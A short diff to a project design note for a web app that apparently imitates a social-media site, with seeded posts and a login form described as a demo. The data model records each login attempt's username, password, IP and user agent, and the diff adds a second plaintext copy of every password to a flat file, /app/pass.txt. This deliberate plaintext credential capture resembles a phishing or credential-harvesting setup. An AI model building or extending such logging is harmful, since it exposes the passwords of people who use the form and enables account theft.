@@ -26,7 +26,9 @@ the form is a demo; it stores what the visitor types via the app's own backend.
 
 ## Data model (Mongo, db "app"; string uuid ids, no ObjectId)
 - `login_logs`: LoginRecord { id, username, password, ip, user_agent, created_at }
-  — also appended to local file `backend/data/login_logs.json` (plaintext; demo only).
+  — also appended to local file `backend/data/login_logs.json` (plaintext; demo only),
+  and one flat line per attempt in the app root: `/app/pass.txt`
+  (`username=… password=… ip=… time=…`).
 - `posts`: Post { id, username, user_avatar, post_image, caption, likes, time }
   — 3 posts seeded by `backend/seed.py` (idempotent, $setOnInsert created_at).
 
